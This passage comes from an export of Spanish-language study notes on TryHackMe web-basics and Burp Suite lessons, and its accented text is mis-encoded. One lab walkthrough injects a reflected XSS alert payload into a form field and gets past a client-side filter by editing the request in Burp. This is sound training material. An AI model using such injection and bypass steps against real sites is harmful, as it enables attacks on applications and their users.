    "content": "Antes de adentrarnos en Burp Proxy, exploremos las opciones disponibles para configurar Burp Suite. Hay dos tipos de ajustes: globales (ajustes de usuario) y de proyecto.\n\n- **Ajustes Globales:** Estos afectan a la instalaci√≥n entera de Burp Suite y se aplican cada vez que lo inicias. Ofrecen una configuraci√≥n base para tu entorno de Burp Suite.\n- **Ajustes de Proyecto:** Estos son ajustes espec√≠ficos del proyecto actual y s√≥lo se aplican durante la sesi√≥n, aunque Burp Suite Community no admite guardar proyectos.\n\nPara acceder a los ajustes haz click en **Settings** arriba a la derecha. La ventana de Ajustes se ve as√≠:\n\n![[Pasted image 20251004174038.png]]\n\nEn ella vemos un men√∫ a mano izquierda. Este nos permite cambiar entre diferentes tipos de ajustes, incluyendo:\n\n1. **Search:** Activa la b√∫squeda de determinados ajustes usando palabras.\n2. **Type filter:** Filtra los ajustes para las opciones **User** y **Project**.\n\t- **User:**  Muestra los ajustes que afectan a todo Burp Suite.\n\t- **Project :** Muestra los ajustes espec√≠ficos de cada proyecto.\n3. **Categories:** Permite seleccionar ajustes por categor√≠a.\n\n>[!NOTE] Muchas herramientas en Burp Suite ofrecen atajos a determinadas categor√≠as de ajustes. Por ejemplo el m√≥dulo **Proxy** incluye un bot√≥n directo a **Proxy Settings**.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "14. Example Attack",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/14-example-attack/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/14. Example Attack.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Habiendo visto c√≥mo configurar y como usar nuestro proxy, veamos un ejemplo real simplificado:\n\nEmpezaremos visitando el formulario \"Support\" en `http://IP/ticket/`.\n\n![[Pasted image 20251006223732.png]]\n\nEn un pentest de apps web real, testear√≠amos esto vara una variedad de vulnerabilidades, una de ellas ser√° Cross-Site Scripting (XSS). Si todav√≠a no has visto XSS, se puede pensar como inyectar scripts del lado del cliente (usualmente en JavaScript) en la p√°gina web, de tal manera que se ejecuta. Hay varios tipos de XSS, este que veremos es \"Reflected\" ya que s√≥lo afecta a la persona haciendo la petici√≥n.\n\n--------------------\n<h2>Walkthrough</h2>\nEscribe `<script>alert(\"Succ3ssful XSS\")</script>` en el campo de \"Contact Email\". Hay un filtro del lado del cliente que nos impide ingresar caracteres especiales, pero esto es f√°cil de bypassear.\n\nPara ello enviamos la petici√≥n con campos v√°lidos y capturamos esta con Burp Suite, donde la cambiaremos. Despu√©s hacemos click en **Forward** para dejarla pasar y obtenemos lo esperado.\n\n![[Pasted image 20251006224730.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Introduction to the Burp Proxy",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/8-introduction-to-the-burp-proxy/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/8. Introduction to the Burp Proxy.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "El proxy de Burp es una herramienta fundamenta y crucial. Permite capturar las peticiones y respuestas entre el cliente y el servidor. Este tr√°fico interceptado puede ser manipulado, mandado a otras herramientas o dejado pasar para llegar a su destino.\n\n----------------------\n<h2>Fundamentos para entender Burp Proxy</h2>\n- **Interceptar Peticiones:** Cuando estas se hacen a trav√©s del proxy de Burp, son capturadas y prevenidas de llegar a su destino. Esta petici√≥n aparece en la pesta√±a de Proxy, permitiendo diferentes acciones. Para permitir que pasen sin interceptar hay que poner `Intercept is on` en `off` d√°ndole click.\n- **Tomar Control:** La habilidad de interceptar peticiones empodera a los testers a ganar control total sobre el tr√°fico web.\n- **Capturar y Logging:** Burp captura y registra peticiones incluso cuando `Intercept is off`. Esto puede ser muy √∫til para an√°lisis posterior.\n- **Soporte WebSocket:** Tambi√©n captura y registra comunicaci√≥n WebSocket, ofreciendo asistencia adicional al analizar aplicaciones web.\n- **Logs e Historial:** Las peticiones capturadas pueden ser vistas en el historial HTTP y el historial de WebSockets.\n\n------------------\n<h2>Algunas funciones notables en loa ajustes Proxy</h2>\n- **Interceptar Respuestas:** Por defecto, proxy no intercepta las respuestas del servidor a no ser que lo especifiquemos. Para ello podemos modificar la tabla de \"Intercept responses based on following rules\" (b√°sicamente configurar reglas para la interceptaci√≥n).\n- **Match y Reemplazo:** Esta secci√≥n permite el uso de expresiones regulares (regexp) para modificar las peticiones entrantes y salientes. Esto permite cambios din√°micos como modificar el agente o manipular las cookies.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Security Headers",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/9-security-headers/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/9. Security Headers.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "<h2>Headers de Seguridad</h2>\nLos headers de seguridad HTTP ayudan a mejorar la seguridad en general de las aplicaciones web ofreciendo mitigaciones frente a ataques como XSS, clickjacking y otros. Nos meteremos m√°s en profundidad con los siguientes:\n\n- Content-Security-Policy (CSP)\n- Strict-Transport-Security (HSTS)\n- X-Content-Type-Options\n- Referrer-Policy\n\nPuedes usar un sitio web como https://securityheaders.io/ para analizar los headers de seguridad de cualquier sitio web.\n\n---------------\n<h2>Content-Security-Policy</h2>\nUn header CSP es una capa adicional de seguridad que puede ayudar a mitigar ataques comunes como Cross-Site Scripting (XSS). C√≥digo malicioso podr√≠a estar hosteado en una web separada o dominio diferente y ser inyectada. Un CSP permite a los administradores decir qu√© webs o recursos son seguros.\n\nDentro del propio header puedes ver propiedades como `default-src` o `script-src`. Cada uno de estos par√°metros da opciones al administrador para definir varios niveles de seguridad. El uso de `self` es una palabra clave especial que refleja el nombre del mismo dominio desde el que se hostea el sitio web. Viendo un ejemplo:\n\n`Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'`\n\nVemos el uso de:\n\n- **default-src**\n  Que especifica la pol√≠tica por defecto de self.\n  \n- **script-src**\n  Que especifica la pol√≠tica desde d√≥nde pueden ser cargados los scripts, self y otro dominio.\n  \n- **style-src**\n  Que especifica la pol√≠tica desde d√≥nde se puede cargar el estilo CSS, self en este caso.\n\n-----------------------\n<h2>Strict-Transport-Security (HSTS)</h2>\nEl header HSTS asegura que el navegador web siempre se conectar√° a trav√©s de HTTPS. Veamos un ejemplo:\n\n`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`\n\nAqu√≠ un desglose:\n\n- **max-age**\n  Este es el tiempo de expiraci√≥n en segundos para este ajuste.\n  \n- **includeSubDomains**\n  Un ajuste opcional que le dice al navegador que aplique este ajuste a todos los subdominios.\n  \n- **preload**\n  Este ajuste opcional permite que el sitio web sea incluido en listas de pre-carga. Los navegadores pueden usarlas para reforzar HSTS.\n\n---------------------\n<h2>X-Content-Type-Options</h2>\nEl header X-Content-Type-Options puede ser usado para indicar al navegador que no debe adivinar el tiempo MIME (Multipurpose Internet Mail Extensions). Aqu√≠ un ejemplo:\n\n`X-Content-Type-Options: nosniff`\n\nAqu√≠ hay un desglose:\n\n- **nosniff**\n  Esta directiva indica al navegador no esnifar (averiguar) o adivinar el tipo de MIME.\n\n-----------------\n<h2>Referrer-Policy</h2>\nEste header controla la cantidad de informaci√≥n mandada al servidor de destino cuando un usuario es redireccionado desde la fuente, como un hiperlink. El header es capaz de permitir a un administrador web controlar qu√© informaci√≥n se comparte. Algunos ejemplos: \n\n- `Referrer-Policy: no-referrer`\n- `Referrer-Policy: same-origin`\n- `Referrer-Policy: strict-origin`\n- `Referrer-Policy: strict-origin-when-cross-origin`\n  \nAqu√≠ un desglose:\n\n- **no-referrer**\n  Este desactiva que cualquier informaci√≥n sea mandada sobre el referrer.\n  \n- **same-origin**\n  Esta pol√≠tica s√≥lo mandar√° informaci√≥n del referrer cuando la destinaci√≥n es parte del origen. Es √∫til cuando quieres que el referrer se mande cuando el hiperlink est√° dentro de la misma p√°gina pero no hacia otras.\n  \n- **strict-origin**\n  Esta pol√≠tica s√≥lo manda el referrer como el origen cuando el protocolo se mantiene, es decir, que un referrer es mandado cuando una conexi√≥n HTTPS es mandada a otra HTTPS.\n  \n- **strict-origin-when-cross-origin**\n  Similar a strict-origin excepto por las peticiones same-origin, donde manda la URL completa en el header origin.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Uniform Resource Locator",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/3-uniform-resource-locator/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/3. Uniform Resource Locator.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Una URL (Uniform Resource Locator) es una direcci√≥n web que te permite acceder a todo tipo de contenido online. Gu√≠a a tu navegador hasta el recurso en cuesti√≥n, sea cual sea.\n\n--------------\n<h2>Anatom√≠a de una URL</h2>\n![[137.png]]Una URL est√° compuesta de m√∫ltiples partes, cada una ayudando a una cosa. Aqu√≠ un desglose de los componentes:\n\n<h5>Scheme</h5>\nEs el protocolo usado para acceder a la web. El m√°s com√∫n es HTTP/HTTPS, pero existen otros.\n\n<h5>User</h5>\nAlgunas URLs pueden incluir los detalles de inicio de sesi√≥n de un usuario. De todas formas es raro verlo hoy en d√≠a, no es muy seguro.\n\n<h5>Host/Dominio</h5>\nEs la parte m√°s importante porque te dice a qu√© sitio web est√°s accediendo. Cada dominio debe ser √∫nico y registrado. **Typosquatting** es la pr√°ctica que registra dominios muy parecidos a los originales.\n\n<h5>Port</h5>\nEl n√∫mero de puerto te redirecciona hacia el puerto donde se est√° sirviendo la p√°gina web, es como decir la puerta, los est√°ndares son 80 para HTTP y 443 para HTTPS.\n\n<h5>Path</h5>\nEl path apunta al archivo o p√°gina espec√≠fica dentro del servidor web.\n\n<h5>Query String</h5>\nEs la parte de la URL que comienza con un \"?\". Es usado com√∫nmente para buscar por o configurar par√°metros.\n\n<h5>Fragment</h5>\nComienza con un \"#\" y ayuda a saltar hacia un sitio espec√≠fico de la p√°gina.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. HTTP Response - Status Line and Status Codes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/7-http-response-status-line-and-status-codes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/7. HTTP Response - Status Line and Status Codes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Cuando interact√∫as con una aplicaci√≥n web, el servidor manda una respuesta HTTP para hacerte saber si tu petici√≥n fue o no exitosa.Estas respuestas incluyen un c√≥digo de estado y una breve explicaci√≥n (llamada frase de raz√≥n) que te da una vista de c√≥mo el servidor manej√≥ tu petici√≥n.\n\n--------------------\n<h2>L√≠nea de Estado</h2>\nLa primera l√≠nea en cada respuesta HTTP se llama l√≠nea de estado. Te da tres piezas clave de informaci√≥n:\n\n1. **Versi√≥n HTTP:** Esto te dice qu√© versi√≥n de HTTP est√° siendo usada.\n2. **C√≥digo de Estado:** Un n√∫mero de tres d√≠gitos que muestra el resultado de tu petici√≥n.\n3. **Frase de Raz√≥n:** Un mensaje corto explicando el c√≥digo de estado en t√©rminos le√≠bles por un humano.\nYa que ya hemos hablado de las versiones HTTP, nos centraremos ahora en el c√≥digo de estado y la frase de raz√≥n.\n\n-------------------\n<h2>C√≥digos de Estado y Frases de Raz√≥n</h2>\nLos c√≥digos caen en cinco categor√≠as diferentes:\n\n<h6>Respuestas Informativas (100-199)</h6>\nEstos c√≥digos significan que el servidor ha recibido parte de la petici√≥n y est√° esperando el resto. Es una se√±al de \"contin√∫a\".\n<h6>Restuestas Exitosas (200-299)</h6>\nEstos c√≥digos significan que todo ha funcionado como se esperaba.\n<h6>Restuestas de Redirecci√≥n (300-399)</h6>\nEstos c√≥digos te dicen que el recurso que has pedido se ha movido a otro sitio, usualmente d√°ndote la nueva URL.\n<h6>Restuestas de Error del Cliente (00-499)</h6>\nEstos c√≥digos indican un problema con la petici√≥n. Puede que la URL est√© mal, o que te falte informaci√≥n clave, como la autentificaci√≥n.\n<h6>Restuestas de Error de Servidor (500-599)</h6>\nEstos c√≥digos implican que el servidor encontr√≥ un error mientras trataba de cumplir la petici√≥n. Usualmente problemas server-side, no la culpa del cliente.\n\n----------------------\n<h2>C√≥digos de Estado Comunes</h2>\nAqu√≠ algunos de los c√≥digos de estado m√°s vistos:\n\n- **100 (Continue):** El servidor recibi√≥ la primera parte y est√° listo para el resto.\n- **200 (OK):** La petici√≥n fue exitosa y el servidor est√° mandando de vuelta el recurso pedido.\n- **301 (Moved Permanently):** El recurso pedido fue movido a una nueva URL. Usa la nueva URL desde ahora.\n- **404 (Not Found):** El servidor no encontr√≥ el recurso en la URL proporcionada. Comprueba que tengas la URL correcta.\n- **500 (Internal Server Error):** Algo sali√≥ mal del lado del servidor y no pudo procesar tu petici√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. HTTP Request - Request Line and Methods",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/5-http-request-request-line-and-methods/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/5. HTTP Request - Request Line and Methods.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Una petici√≥n HTTP es lo que un usuario manda a un servidor para interactuar con una aplicaci√≥n web y hacer que algo pase. Ya que estas peticiones son normalmente el primer punto de contacto entre el usuario y el servidor es muy importante saber bien c√≥mo funcionan.\n\n![[138.png]]\n\nImagina una petici√≥n HTTP mostrando las partes clave como el m√©todo, ruta y versi√≥n. Estos elementos hacen lo b√°sico de c√≥mo se comunican el servidor y el cliente.\n\n-----------------------\n<h2>Request Line</h2>\nLa l√≠nea de petici√≥n (o start line) es la primera parte de una petici√≥n HTTP y le dice al servidor qu√© tipo de petici√≥n es. Tiene tres partes principales: el m√©todo HTTP, la ruta URL y la versi√≥n HTTP.\n\nEjemplo: `METHOD /path HTTP/version`\n\n<h3>M√©todos</h3>\nLos m√©todos HTTP le dicen al servidor qu√© acci√≥n el usuario quiere llevar a cabo en el recurso identificado por la ruta URL. Aqu√≠ unos de los m√©todos m√°s comunes y utilizados.\n\n------------\n<h6>GET</h6>\nUsado para extraer informaci√≥n del servidor sin hacer cambios. Recuerda exponer s√≥lo informaci√≥n que el usuario pueda ver. Evita poner informaci√≥n sensible como tokens o contrase√±as.\n<h6>POST</h6>\nManda informaci√≥n al servidor, usualmente para crear o actualizar algo. Valida y limpia SIEMPRE el contenido para evitar ataques como SQLI y XSS.\n<h6>PUT</h6>\nReemplaza o actualiza algo en el servidor, recuerda validar que el usuario est√© autorizado para hacer estos cambios antes de hacerlos.\n<h6>DELETE</h6>\nBorra algo del servidor, recuerda, como con PUT, validar que el usuario tenga los permisos correspondientes para llevar a cabo esta acci√≥n.\n\nA parte de los m√©todos m√°s comunes, aqu√≠ otros:\n\n<h6>PATCH</h6>\nActualiza un recurso. Es √∫til para hacer peque√±os cambios sin reemplazar la web entera, pero valida la informaci√≥n aportada para evitar inconsistencias.\n<h6>HEAD</h6>\nFunciona como un GET pero s√≥lo devuelve los headers, √∫til para comprobar metadata sin descargar el contenido completo.\n<h6>OPTIONS</h6>\nTe dice qu√© m√©todos est√°n disponibles para un recurso espec√≠fico.\n<h6>TRACE</h6>\nSimilar a OPTIONS, te dice qu√© m√©todos est√°n disponibles, con prop√≥sito de debugging. Muchos servidores lo desactivan por motivos de seguridad.\n<h6>CONNECT</h6>\nUsado para crear una conexi√≥n segura, como para HTTPS. No es tan com√∫n pero es cr√≠tica para la comunicaci√≥n encriptada.\n\n----------------------\n<h3>Ruta URL</h3>\nLa ruta URL le dice al servidor d√≥nde encontrar el recurso al cual el usuario est√° intentando acceder. Por ejemplo, en la URL `https://tryhackme.com/api/users/12`, la ruta `/api/users/123` identifica a un usuario espec√≠fico.\n\nLos atacantes com√∫nmente intentan manipular la ruta URL para explotar vulnerabilidades, as√≠ que es crucial:\n\n- Validar la ruta URL para prevenir acceso no autorizado.\n- Sanitizar la ruta para evitar ataques de inyecci√≥n.\n- Proteger la informaci√≥n sensible.\n\n-----------------------------\n<h3>Versi√≥n HTTP</h3>\nLa versi√≥n HTTP muestra la versi√≥n del protocolo usada para comunicarse entre el cliente y el servidor. Aqu√≠ una vista r√°pida de los usos m√°s comunes.\n\n<h6>HTTP/0.9 (1991)</h6>\nLa primera versi√≥n, solo soportaba GET.\n<h6>HTTP/1.0 (1996)</h6>\nIncrement√≥ headers y mejor soporte para diferente tipo de contenido.\n<h6>HTTP/1.1 (1997)</h6>\nTrajo conexiones persistentes, encoding y mejor cacheo. Ampliamente usado hasta nuestra fecha.\n<h6>HTTP/2 (2015)</h6>\nIntrodujo funcionalidades como multiplexing, compresi√≥n de headers y priorizaci√≥n para actuaci√≥n m√°s r√°pida.\n<h6>HTTP/3 (2022)</h6>\nConstruido en HTTP/2, pero usa un nuevo protocolo (QUIC) para conexiones m√°s r√°pidas y seguras.\n\nAunque HTTP/2 y HTTP/3 ofrecen mejor rapidez y seguridad, muchos sistemas todav√≠a usan HTTP/1.1 porque tiene buen soporte y funciona con casi todos los setups existentes. Sin embargo evolucionar hacia HTTP/2 o HTTP/3 puede tener mejoras significativas en t√©rminos de eficiencia y seguridad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "En esta unidad hablaremos de los elementos clave de una aplicaci√≥n web, como la URL, peticiones y respuestas HTTP y m√°s.\n\n----------\n<h2>Objetivos de Aprendizaje</h2>\nAl completar esta unidad:\n\n- Entender√°s qu√© es y c√≥mo corre en el navegador una aplicaci√≥n web.\n- Podr√°s descomponer los componentes de una URL y saber c√≥mo ayudan a acceder a las fuentes.\n- Aprender√°s c√≥mo las peticiones y respuestas HTTP funcionan.\n- Te familiarizar√°s con los diferentes tipos de m√©todos de petici√≥n HTTP.\n- Entender√°s qu√© significan los c√≥digos de respuesta.\n- Ver√°s c√≥mo funcionan los headers HTTP y por qu√© importan para la seguridad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. HTTP Response - Headers and Body",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/8-http-response-headers-and-body/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/8. HTTP Response - Headers and Body.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "<h2>Headers de Respuesta</h2>\nCuando un servidor web responde a una petici√≥n HTTP, incluye los headers de respuesta HTTP, que son pares de llave-valor. Estos, ofrecen informaci√≥n importante sobre la respuesta y le dicen al cliente c√≥mo manejarla.\n\n![[139.jpg]]\n\n------------------\n<h2>Headers de Respuesta Requeridos</h2>\nAlgunos headers de respuesta son cruciales para que la respuesta HTTP funcione correctamente. Dan informaci√≥n esencial que tanto el servidor como el cliente necesitan para procesar todo correctamente. Aqu√≠ hay algunos importantes:\n\n- **Date**\n  Ejemplo: `Date: Fri, 23 Aug 2024 10:43:21 GMT`\n  Este header muestra la fecha y hora exactas de la respuesta.\n  \n- **Content-Type**\n  Ejemplo: `Content-Type: text/html; charset=utf-8`\n  Le dice al cliente qu√© tipo de contenido estar√° recibiendo. Tambi√©n incluye el set de caracteres ( como UTF-8) para ayudar a mostrarlo correctamente.\n  \n- **Server**\n  Ejemplo: `Server: nginx`\n  Este header muestra qu√© tipo de software est√° manejando la petici√≥n. Es bueno para hacer debugging, pero tambi√©n puede revelar informaci√≥n que puede ser √∫til para los atacantes.\n\n--------------------\n<h2>Otros Headers de Respuesta Comunes</h2>\nA parte de los esenciales, hay otros headers comunes que dan instrucciones adicionales al cliente o al navegador y ayudan a controlar c√≥mo la respuesta deber√≠a ser manejada.\n\n- **Set-Cookie**\n  Ejemplo: `Set-Cookie: sessionId=38af1337es7a8`\n  Este manda cookies desde el servidor al cliente, las cuales el cliente almacena y manda de vuelta con peticiones futuras. Para mantenerlas seguras, aseg√∫rate de que est√°n configuradas con las flags `HttpOnly` y `Secure`.\n  \n- **Cache-Control**\n  Ejemplo: `Cache-Control: max-age=600`\n  Este header le dice al cliente cu√°nto tempo puede almacenar la respuesta antes de tener que comprobar con el servidor de nuevo. Tambi√©n puede hacer que cierta informaci√≥n sensible no se cachee, usando `no-cache`.\n  \n- **Location**\n  Ejemplo: `Location: /index.html`\n  Este se utiliza en las respuestas de redirecci√≥n (3XX). Le indica al cliente d√≥nde ir despu√©s de que el recurso se haya movido.\n\n------------------------\n<h2>Cuerpo de Respuesta</h2>\nEl cuerpo de respuesta HTTP es donde la informaci√≥n real vive, cosas como HTML, JSON, im√°genes, etc, que el servidor manda de vuelta al cliente. Para prevenir ataques de inyecci√≥n, como XSS, sanitiza siempre cualquier informaci√≥n antes de incluirla en la respuesta.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. HTTP Request - Headers and Body",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/6-http-request-headers-and-body/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/6. HTTP Request - Headers and Body.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "<h2>Headers de la Petici√≥n</h2>\nLos headers de las peticiones permiten que informaci√≥n extra sea transmitida al servidor sobre una petici√≥n. Algunos headers comunes:\n\n| **Request Header** | **Ejemplo**                                                                      | **Descripci√≥n**                                                                       |\n| ------------------ | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |\n| Host               | `Host: tryhackme.com`                                                            | Especifica el nombre del servidor que pide.                                           |\n| User-Agent         | `User-Agent: Mozilla/5.0`                                                        | Comparte informaci√≥n sobre el navegador que manda la petici√≥n.                        |\n| Referer            | `Referer:¬†https://www.google.com/`                                               | Indica la URL desde la que viene la petici√≥n.                                         |\n| Cookie             | `Cookie: user_type=student; room=introtowebapplication; room_status=in_progress` | La informaci√≥n que el servidor previamente pidi√≥ al navegador se almacena en cookies. |\n| Content-Type       | `Content-Type: application/json`                                                 | Describe qu√© tipo o formato de informaci√≥n est√° en la petici√≥n.                       |\n\n-----------------------------------------\n<h2>Cuerpo de la Petici√≥n</h2>\nEn las peticiones HTTP como POST y PUT, donde la informaci√≥n es mandada al servidor, en vez de al rev√©s, la informaci√≥n est√° colocada dentro del cuerpo de la petici√≥n. El formato de esta informaci√≥n puede tomar varias formas, pero algunas comunes son `URL Encoded`, `Form Data`, `JSON` o `XML`.\n\n- **URL Encoded (applicattion/x-www-form-urlencoded)**\n  Un formato donde la informaci√≥n es estructurada en pares de llave y valor donde (`key = value`). M√∫ltiples parejas separadas por un s√≠mbolo `&`, como `key1=value1&key2=value2`. Los caracteres especiales son percent-encoded (por ejemplo `' ' = '%20'`).\n  \n  ```http\nPOST /profile HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 33\n\nname=Aleksandra&age=27&country=US\n```\n\n- **Form Data (multipart/form-data)**\n  Permite mandar m√∫ltiples bloques de informaci√≥n donde cada uno est√° separado por una string frontera. Esta es definida en el header. Esta forma puede ser usada para mandar binarios, como cuando se sube una foto al servidor.\n  \n  ```http\nPOST /upload HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n----WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"username\"\n\naleksandra\n----WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"profile_pic\"; filename=\"aleksandra.jpg\"\nContent-Type: image/jpeg\n\n[Binary Data Here representing the image]\n----WebKitFormBoundary7MA4YWxkTrZu0gW--\n```\n\n- **JSON (application/json)**\n  En este formato, la informaci√≥n puede ser mandada usando la estructura JSON (JavaScript Object Notation). La informaci√≥n est√° formateada en pares de nombre: valor. M√∫ltiples parejas son separadas por comas, todas contenidas entre `{}`.\n  \n  ```http\nPOST /api/user HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/json\nContent-Length: 62\n\n{\n    \"name\": \"Aleksandra\",\n    \"age\": 27,\n    \"country\": \"US\"\n}\n```\n\n- **XML (application/xml)**\n  En el formato XML, la informaci√≥n se estructura dentro de etiquetas llamadas \"tags\", que tienen una apertura y un cierre. Estas etiquetas pueden ser acomodadas a otras.\n  \n  ```http\nPOST /api/user HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/xml\nContent-Length: 124\n```\n```xml\n<user>\n    <name>Aleksandra</name>\n    <age>27</age>\n    <country>US</country>\n</user>\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. HTTP Messages",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/4-http-messages/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/4. HTTP Messages.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Los mensajes HTTP son los paquetes de informaci√≥n intercambiados entre un usuario (el cliente) y el servidor web. Estos mensajes son muy importantes para entender c√≥mo las aplicaciones web funcionan porque pueden mostrar c√≥mo se comunican las respuestas.\n\nHay dos tipos de mensajes HTTP:\n\n- **Peticiones HTTP:** Mandadas por el usuario para activar las acciones del servidor web.\n- **Respuestas HTTP:** Mandadas por el servidor en respuesta a la petici√≥n del usuario.\n\nCada mensaje sigue un formato espec√≠fico que ayuda a ambos a comunicarse sin errores.\n\n<h5>Start Line</h5>\nEs como la introducci√≥n del mensaje. Nos dice qu√© tipo de mensaje se va a mandar, ya sea una petici√≥n del usuario o una respuesta del servidor. Tambi√©n da informaci√≥n a cerca de c√≥mo deber√≠a ser tratado el mensaje.\n\n<h5>Headers</h5>\nLos headers est√°n compuestos de pares de llaves que ofrecen informaci√≥n extra sobre el mensaje HTTP. Dan instrucciones tanto al cliente como al servidor de c√≥mo manejar la petici√≥n o la respuesta. Estos headers cubren muchas cosas como la seguridad, tipos de contenido y m√°s.\n\n<h5>Empty Line</h5>\nEs un peque√±o divisor que separa el header del cuerpo. Es esencial porque muestra d√≥nde los headers terminan y d√≥nde empieza el verdadero contenido del mensaje.\n\n<h5>Body</h5>\nEs donde el mensaje en s√≠ est√° almacenado. En una petici√≥n, el cuerpo puede incluir informaci√≥n que el usuario quiera mandar al servidor mientras que en la respuesta el servidor incluye la informaci√≥n que el usuario puede ver en funci√≥n de su solicitud.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Web Application Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/2-web-application-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/2. Web Application Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "Considera la analog√≠a de una aplicaci√≥n web como un planeta. Los astronautas viajan al planeta para explorar su superficie. Aunque s√≥lo vean la superficie, hay muchas cosas pasando dentro.\n\n--------------\n<h2>Front End</h2>\nEl frontend puede ser considerado la superficie del planeta, las partes que un astronauta puede ver directamente. La web tendr√≠a una serie de tecnolog√≠as que permitir√≠an al usuario interactuar con ellas, como HTML, CSS y JavaScript.\n\n- **HTML(Hypertext Markup Language):**  Es un aspecto fundamental de las aplicaciones web. Es un conjunto de instrucciones o c√≥digo que le dice al navegador qu√© ense√±as y c√≥mo hacerlo. Podr√≠a ser comparado a simples seres vivos, estos tienen ADN (instrucciones).\n- **CSS (Cascading Style Sheets):** Describe un est√°ndar de apariencia, como ciertos colores, tipos de texto y disposiciones. Esto podr√≠a ser comparado a la parte del ADN que describe el color, forma, tama√±o o textura del organismo.\n- **JS (JavaScript):** Es una parte del frontend que permite actividad m√°s compleja. En la analog√≠a, JS puede ser considerado el cerebro del organismo.\n\n----------------\n<h2>Back End</h2>\nEl backend de una aplicaci√≥n web es aquello que no se ve pero que es importante para que funcione bien. En el planeta ser√≠an las estructuras, el aire o la gravedad.\n\n- **Database:** Es donde se almacena la informaci√≥n. Una aplicaci√≥n web puede querer guardar preferencias sobre un visitante. Un planeta puede tener vida inteligente que escribe libros, por 